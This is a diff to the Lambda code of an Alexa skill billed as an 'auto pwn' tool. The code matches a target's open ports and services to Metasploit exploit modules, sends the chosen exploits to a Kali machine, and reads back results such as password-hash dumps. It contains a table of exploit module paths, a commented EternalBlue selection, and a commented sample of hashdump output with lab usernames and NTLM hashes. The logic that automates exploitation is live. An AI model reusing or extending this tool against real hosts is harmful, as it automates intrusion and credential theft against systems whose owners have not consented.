@@ -1,11 +1,23 @@
-﻿'use strict';
-// By David Cross
+'use strict';
+//   HackerMode 2 Auto pwn lambda portion
+//   Copyright (C) 2019 David Cross
+//    This program is free software: you can redistribute it and/or modify
+//    it under the terms of the GNU General Public License as published by
+//    the Free Software Foundation, either version 3 of the License, or
+//    (at your option) any later version.
+//    This program is distributed in the hope that it will be useful,
+//    but WITHOUT ANY WARRANTY; without even the implied warranty of
+//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+//    GNU General Public License for more details.
+//    You should have received a copy of the GNU General Public License
+//    along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
 // This really needs to be rewritten in Python
 // A) because I hate the call-back suckishness of early Node
 // B) because Python supports synch and asynch web calls which is handy 
 // C) because Python rocks
 // D) because this was my second Alexa skill and I was in a hurry to get it coded up
-const APP_ID = "amzn1.ask.skill.ffffff24-ff71-43fe-8ff7-d3f363bff222"; // TODO replace this sample app ID with your app ID.
+const APP_ID = "amzn1.ask.skill.dd150dc5-6d00-418e-8e91-6e105a4c1fce"; // TODO replace with your app ID if customizing your own copy.
 const Alexa = require('alexa-sdk');
 //const request = require('sync-request');
 //const awsSDK = require('aws-sdk');
@@ -13,7 +25,7 @@ const https = require('https');
 //var Data = require("./data");
 var crypto = require('crypto');
 
-// the following typically looks like: "exploit/osx/mdns/upnp_location" : "0", 
+// the following typically looks like: "exploit/osx/mdns/upnp_location" : "0", // but pymetasploit uses just the part after the exploit/
 const exploitports = { "EXPLOITPORTS_EN_US":{
 "osx/mdns/upnp_location" : "0",
 "windows/dcerpc/ms07_029_msdns_zonename" : "0",
@@ -1212,7 +1224,6 @@ const ports = { "PORTS_EN_US" : {
 	"999" : "Port 999 TCP Sciamore-DB Database System.",
 	"1010" : "Port 1010 TCP is ThinLinc web-based admin interface.",
 	"1023" : "Port 1023 TCP or UDP is Reserved.",
-	// Registered ports or turn up a port query server for this function...
 	"1024" : "Port 1024 is reserved.",
 	"1025" : "Port 1025 TCP is reserved.",
 	"1027" : "Port 1027 UDP is Native IP-v6 behind IP-v4-to-IP-v4 NAT.",
@@ -2170,6 +2181,61 @@ const responsecodes = {   "RESPONSECODES_EN_US" : {
 	"505": "505 is HTTP Version Not Supported."
 }};	
 
+//single match Fuzzy Search hacker style ////////////////////////////
+//var a = "exploit\\unreal\\irc\\server"
+//var b= ""
+//var b = "UnrealIRCd"   // blue pill left side
+//var b = "uUnrealIRCd"   // blue pill left side
+//var b = "UnIRCunredr"  // left substr 2 passes via red pill
+//var b = "aIRCsUnreala" // red pill right side 
+//var b= "uuuunreal" // blue pill right side
+
+// bool = fuzzysearch(b,a,4));
+
+function doessubofsubexist(m,s,nchars){
+  console.log('>>in standard search');
+  var i=0; m=m.toLowerCase(); 
+  var brez=false; // left to right
+  while ((nchars <= m.length-i) && (brez==false)) {brez=s.includes(m.substring(0,m.length-i)); i++;} 
+  if (brez==true) {console.log(">>"+ m.substring(0,m.length-(i-1))); return true; 
+  }
+  else  // right to left
+  { i=0; while ((m.length-i >= nchars) && (brez==false)) {brez=s.includes(m.substring(i,m.length)); i++;}
+    if (brez==true) {console.log(">>"+m.substring(i-1,m.length)); return true; 
+    }
+  }
+  return brez;
+}
+function doesextractofsubexist(m,s,nchars){
+  var i=0; m=m.toLowerCase();
+  var found=false; 
+  // left to right
+  while ((nchars <= m.length) && (found==false)) {m = m.substring(0,m.length-1); console.log('>>>sending left substr into fuzzy:' + m);  found=doessubofsubexist(m,s,nchars); i++;
+  } 
+  if (found==true) {console.log(">>"+m); return true;}
+  else
+  // right to left
+  { i=0; while ((m.length >= nchars) && (found==false)) {m=m.substring(i+1,m.length); console.log('>>>sending right substr into fuzzy:' + m);found=doessubofsubexist(m,s,nchars); i++;}
+  if (found==true) {console.log(">>>"+m); return true; }
+  }
+  return found;
+}
+
+function fuzzysearch(b,a,nchars)
+{
+  if (nchars >= b.length) return false;  // if they are trying to match 3 or less chars kick it back.
+  console.log(']in search wrapper');
+  if (doessubofsubexist(b,a,nchars) == true) {console.log(']blue pill worked'); return true;}
+  else if
+   (doesextractofsubexist(b,a,nchars) == true) {console.log(']had to take the red pill'); return true;}
+  else
+    {
+      console.log(']Neither pill worked'); 
+      return false;
+    }
+}
+////// end of fuzzy search//////////////////////////////////
+
 // Web request functions //////////////////////////////////
 //////////////////// Send AlexaToKaliQueuePage //////////////////////
     function sendAlexa2KaliRequest(action,actionvalue)
@@ -2227,6 +2293,7 @@ const handlers = {
         //console.log("Intent" + this.event.request.intent);
         //console.log("Slots:" + this.event.request.intent.slots);
         var speechOutput = "I ran into an unhandeled error"; // this.t('UNHANDLED_SPEECH');
+        console.log("THIS.EVENT = " + JSON.stringify(this.event));
         this.emit(':tell', speechOutput);
     },
     
@@ -2303,6 +2370,7 @@ const handlers = {
 	
     'WebHeadersIntent': function () {
         const itemSlot = this.event.request.intent.slots.WHItem;
+        console.log("THIS.EVENT = " + JSON.stringify(this.event));
         let itemName;
         if (itemSlot && itemSlot.value) {
             itemName = itemSlot.value.toLowerCase();
@@ -2336,6 +2404,7 @@ const handlers = {
 
 
     'HTTPVerbsIntent': function () {
+    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
         const itemSlot = this.event.request.intent.slots.HVItem;
         let itemName;
         if (itemSlot && itemSlot.value) {
@@ -3233,28 +3302,30 @@ const handlers = {
 },
 
 'exploitres': function() { 
+	this.attributes.repromptSpeech = "To get status you can ask, how's the hack going.";  // don't say anything if we're just going to the next function in the state queue
+	this.emit(':ask', this.mstatus, "If you want to find out about how the hack is going, just say How's the hack going?");
 	console.log("<exploitres> check on hack!");
 	// **** a test string to see if you can parse the returning shell info appropriately... if you make changes to the parser, you can use 
 	// **** the shackres string as a quick sanity check by calling this function from a test
 	//var shackres = "";
-		var shackres ='{"responsetype": "exploitres", "openports": [], "portscanres": "", "exploitres": "success", "searchres": "", ' +
-		'"usepayloadres": "[*] Obtaining the boot key... Server username: METASPLOITABLE3\vagrant ...got system via technique 1 ' +
-		'(Named Pipe Impersonation (In Memory/Admin)). [*] Calculating the hboot key using SYSKEY 4fe4ffce3ea2a8d145014ca797aeaf89... ' +
-		'[*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... No users with password hints ' +
-		'on this system [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035::: leah_organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028::: luke_skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a::: han_solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951::: artoo_detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4::: c_three_pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee::: ben_kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859::: darth_vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0::: anakin_skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa::: jarjar_binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4::: lando_calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f::: boba_fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9::: jabba_hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76::: greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db::: chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8::: kylo_ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001::: ", "shellres": "", "getuidres": "", "windows": "True", "exploit": "", "rhost": "192.168.1.56", "lhost": "192.168.137.197", "payload": "", "rport": "8000", "lport": "4000", "exploits": "", "sessions": "1", "postmodule": "hashdump", "error": "Success", "mstatus": "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."}|sig=sig=somesignature';
+//		var shackres ='{"responsetype": "exploitres", "openports": [], "portscanres": "", "exploitres": "success", "searchres": "", ' +
+//		'"usepayloadres": "[*] Obtaining the boot key... Server username: METASPLOITABLE3\vagrant ...got system via technique 1 ' +
+//		'(Named Pipe Impersonation (In Memory/Admin)). [*] Calculating the hboot key using SYSKEY 4fe4ffce3ea2a8d145014ca797aeaf89... ' +
+//		'[*] Obtaining the user list and keys... [*] Decrypting user keys... [*] Dumping password hints... No users with password hints ' +
+//		'on this system [*] Dumping password hashes... Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035::: leah_organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028::: luke_skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a::: han_solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951::: artoo_detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4::: c_three_pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee::: ben_kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859::: darth_vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0::: anakin_skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa::: jarjar_binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4::: lando_calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f::: boba_fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9::: jabba_hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76::: greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db::: chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8::: kylo_ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001::: ", "shellres": "", "getuidres": "", "windows": "True", "exploit": "", "rhost": "192.168.1.56", "lhost": "192.168.137.197", "payload": "", "rport": "8000", "lport": "4000", "exploits": "", "sessions": "1", "postmodule": "hashdump", "error": "Success", "mstatus": "I successfully retrieved user names and hashes and took the liberty of printing them to your Kali terminal."}|sig=sig=somesignature';
 	
-	var hackres = JSON.parse(shackres);
-	if (hackres.responsetype == "exploitres") 
+//	var hackres = JSON.parse(shackres);
+//	if (hackres.responsetype == "exploitres") 
 	{
 		//	for some reason the string is getting characters in it that are not friendly to JSON. TODO: debug JSON output on Python side
-//  parse the homebrew message into message and signature
-// TODO: validate signature versus keyed hash with key being Alexa in app config
-	var splitme = shackres.split('|');
-	shackres = splitme[0]; // left side
-	var sig = splitme[1];  // right side
+////  parse the homebrew message into message and signature
+//// TODO: validate signature versus keyed hash with key being Alexa in app config
+//	var splitme = shackres.split('|');
+//	shackres = splitme[0]; // left side
+	//var sig = splitme[1];  // right side
 	
-	console.log('About to do for loop');
-//	var s = shackres.split('');
+//	console.log('About to do for loop');
+////	var s = shackres.split('');
 	// for some reason replace of some character groups won't work in string replace TODO: look into this later for now no time to debug crappy string handling
    // for (var i = 0; i < s.length; i++) {
         //if (s[i].charCodeAt(0) < 20) s[i] = " ";
@@ -3264,20 +3335,20 @@ const handlers = {
         //if (s[i] == ")") s[i] = " ";
        // if (s[i] == "/") s[i] = " ";
        // if (s[i] == "_") s[i] = " "; 
- //   }
- //   console.log('about to join string back from array');
- //       shackres = s.join('');
+ ////   }
+ ////   console.log('about to join string back from array');
+ ////       shackres = s.join('');
     
      
-//console.log('about to parse JSON');
-//var hackres = JSON.parse(newres);
-//console.log('about to assign the value of usepayloadres');
+////console.log('about to parse JSON');
+////var hackres = JSON.parse(newres);
+////console.log('about to assign the value of usepayloadres');
 
-//	} 
-//	else 
-//	{ 
-//		this.emit(":ask","I got a response type from Kali of " + hackres.reponsetype, "What would you like me to do?");
-//	}
+////	} 
+////	else 
+////	{ 
+////		this.emit(":ask","I got a response type from Kali of " + hackres.reponsetype, "What would you like me to do?");
+////	}
 	
 	//
 	//this.emitWithState("SessionEndedRequest");
@@ -3341,13 +3412,16 @@ const handlers = {
 	
 },
 
-//'UseExploitIntent': function () {
+//"shouldEndSession": true,
+//'UseExploitIntent': function () { }
+
 'exploit': function () {
+	console.log(">>EXPLOIT<< THIS.EVENT = " + JSON.stringify(this.event));
 	  console.log("Exploit matching function");
   // Choose list of exploits for port X, Y, Z
  // if (this.attributes['rhost'] === '8000') {  this.attributes['exploit'] = 'windows\http_header\icecast:8000'; }
  //this.attributes['exploit']= 'crap\crap:10';
-if (this.attributes['rhost'] === '445') { this.attributes['exploit'] = 'windows\smb\ms17_010_eternalblue:445'; }
+//if (this.attributes['rhost'] === '445') { this.attributes['exploit'] = 'windows\smb\ms17_010_eternalblue:445'; }
 console.log("Open ports=" + this.attributes.openports + "  Exploit rhost is:" + this.attributes.rhost);
 const explDB = this.t('EXPLOITPORTS');
 console.log("JSON of explDB=" + JSON.stringify(explDB));
@@ -3361,9 +3435,9 @@ console.log("exploitDB items=" + explDB);
  for (var w in openports)
   	{
   	    if(openports[w].service.match(/Microsoft/i)) windows = true; //Windows
-  	  //  if(openports[w].match(/Microsoft/i)) windows = true; //Windows
   	}
-  console.log("Windows=" + windows);
+  console.log("Windows=" + windows); // will log True of False
+
   if (openports.length > 0) iend= openports.length;
   
   if (!openports) { console.log("Openports are not set, so they can't be parsed!");}
@@ -3375,7 +3449,7 @@ console.log("exploitDB items=" + explDB);
   {
   	console.log("i= " + i);
   	poor = openports[i].port;
-  	
+  	//console.log("Exploit matching with Fuzzy search");
   	console.log("Looping through open ports: " + poor); // JSON.stringify(poor));
   	// loop through the entire exploit json object to get all the matches possible
   	//for (var j = 0; j < jend; j++)
@@ -3387,45 +3461,60 @@ console.log("exploitDB items=" + explDB);
   			// then add to the new array holding exploits to try
   			console.log("DB port = " + explDB[j] + "=" + poor);
   			var words = openports[i].service.split(" ");
-  			console.log("words are: " + words[0] + "," + words[1]);
+  			console.log("words are: " + words[0] );
   			if (windows === true && (j.match(/windows/i) ))  // we don't want to match multi yet
   			{ 
   			    console.log("Windows matched");
-  			    var s = j.toString();
+//UGH!
+  			    var s = j.toString().replace(' ','_');
   			    console.log("Exploit line (s) =" + s);
-  			   if (s.indexOf(words[0].toLowerCase()) > -1 ) {
-  			   	console.log(words[0] + " or " + words[1] + " matched");
-  			   	// windows is try and port is the same and a word matches so it's at the start of the list as a most likely target
-  			   	exploitarray = '{"exploit":"' + s + '", "port":"' + poor + '"},' + exploitarray;
+  			    
+  			   //if (s.indexOf(words[0].toLowerCase()) > -1 ) {
+  			   if ( fuzzysearch(words[0],s,4)) {	
+  			   	console.log(words[0] + " matched");
+  			   	// windows and port is the same and a word matches so it's at the start of the list as a most likely target
+  			   	exploitarray = '{"exploit":"' + s + '","port":"' + poor + '"},' + exploitarray;
   			    console.log("exploitarray =" + exploitarray);
   			   }
-  			   // windows is true and the port is the same so add it to the end of the list
-  			   else{ exploitarray = exploitarray + '{"exploit":"' + s + '", "port":"' + poor + '"},'; }
-  			   
+  			   // we made a match but didn't get a hit on the service name so add it to the end of the list
+  			   else{ exploitarray = exploitarray + '{"exploit":"' + s + '","port":"' + poor + '"},'; }
   			}
-  			if (windows === false && ( j.match(/linux/i) )) //If not Win and Linux in the string YAY! but we don't want to match multi or other weird types yet
+  			if (windows === false && ( j.match(/linux/i) || j.match(/unix/i) )) 
+  			//If not Linux or unix in the string YAY! but we don't want to match multi or other types yet
   			{   			   
-  				console.log("Linux matched");
-  			    var ls = j.toString();
-  			   if (ls.indexOf(words[0].toLowerCase()) > -1 ) {
-  			   	console.log(words[0] + " or " + words[1] + " matched");
-  			    exploitarray = exploitarray + '{"' + j + '":"' + poor + '"},';
+  				console.log("Linux or unix matched");
+//UGH!
+  			    var ls = j.toString().replace(' ','_');
+  			    console.log("Exploit line (j) =" + j);
+  			  // if (ls.indexOf(words[0].toLowerCase()) > -1 ) {
+  			  if ( fuzzysearch(words[0],ls,4)) { 	
+  			   	console.log(words[0] + " matched");
+  			   	// linux and port is the same and a word matches so it's at the start of the list as a most likely target
+  			    exploitarray = '{"exploit":"' + ls + '","port":"' + poor + '"},' + exploitarray;
   			    console.log("exploitarray =" + exploitarray);
   				}
+  			   // we made a match but didn't get a hit on the service name so add it to the end of the list
+  			   else{ exploitarray = exploitarray + '{"exploit":"' + ls + '","port":"' + poor + '"},'; }
   			} 
-	
   		}
   	}
   //	console.log("NewExploitArray = " + newexplarray);
   }
-  	var newexplarray = exploitarray.substr(0, exploitarray.length-1); // chop the trailing comma off
+    if (exploitarray.substr(exploitarray.length-2,exploitarray.length)===", ") 
+    {	newexplarray = exploitarray.substr(0, exploitarray.length-2); // chop the trailing comma off
+    } 
+    else if (exploitarray.substr(exploitarray.length-1,exploitarray.length)===",")
+    {	newexplarray = exploitarray.substr(0, exploitarray.length-1); // chop the trailing comma off
+    } 
+    else {var newexplarray = exploitarray;} 
   	newexplarray = "[" + newexplarray + "]";
-  console.log("Exploit array= " + JSON.stringify(newexplarray));  console.log("Exploit array= " + JSON.stringify(newexplarray));
+  console.log("Fuzzy Exploit array= " + JSON.stringify(newexplarray));  
+  console.log("----Exploit array= " + JSON.stringify(newexplarray));
   
   // set the global state vars and push the state to Kali
   this.attributes['attribname'] = "exploit";
   console.log ('Setting state machine to exploit');
-  this.attributes['attribvalue'] = newexplarray; //exploit name
+  this.attributes['attribvalue'] = newexplarray.replace(" ","_"); //exploit name
   //console.log ("About to save state");
   //this.emit(':saveState', true);
   console.log ("Going to emit SendToKali to wait for loot data or failure to be returned.");
@@ -3435,6 +3524,7 @@ console.log("exploitDB items=" + explDB);
 // Intent to send command to Kali helps keep the asynch of the web request contained
  'SendToKali': function()
     {
+    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
         //console.log("About to do the crypto hash for Hack request");
         var signature = crypto.createHash('md5').update(this.attributes['attribvalue'] + process.env.SecretKey).digest("hex");
         var hoststr = "https://" + process.env.SecretURL +"/" + process.env.AlexaToKaliQueuePage +"?cmd=" + this.attributes['attribname'] + "=" + this.attributes['attribvalue'] + "&sig=" + signature;
@@ -3465,6 +3555,7 @@ console.log("exploitDB items=" + explDB);
 'PollKali': function() {
 	// keep track of how many times we've waited for Kali. A 3 count should be more than enough.
 	console.log("in PollKali");
+	console.log("THIS.EVENT = " + JSON.stringify(this.event));
 	if (!this.attributes['pollKaliCount']) this.attributes['pollKaliCount'] = 0; else this.attributes['pollKaliCount']++; 
 
 	if(this.attributes['pollKaliCount'] < 3) {
@@ -3585,7 +3676,7 @@ console.log("exploitDB items=" + explDB);
     		newres = newres.replace("username:", "username is");
 			newres = newres.replace( /:(.+?):::/g, " " );
 			newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
-			
+			newres = newres.replace('_',' ');
 			newres = newres.replace( /:(.+?):::/g, " " );
 			newres = newres.replace(/SYSKEY(.+?)\.\.\./g,"Sys Key");
 			console.log("newres parsed postexploit is: " + newres);
@@ -3598,6 +3689,7 @@ console.log("exploitDB items=" + explDB);
 },
 
 'shell': function() {
+	console.log("THIS.EVENT = " + JSON.stringify(this.event));
 	console.log("Result of READ SHELL is: " + this.attributes['mstatus'] + " error = " + this.attributes['error']);
 	this.attributes.speechOutput = this.attributes['mstatus'];
 	if (this.attributes['error'] != 0) this.attributes.speechOutput = "The exploit was successuful."; else this.attributes.speechOutput = "The exploits didn't work on the target system.";
@@ -3649,7 +3741,7 @@ console.log("exploitDB items=" + explDB);
 
 },
     
-    'AMAZON.HelpIntent': function () {
+   'AMAZON.HelpIntent': function () {
         var randomN = getRandomInt(0,3);
         var helpMessage="Random Number is ";
         var repromptMessage = "Reprompt";
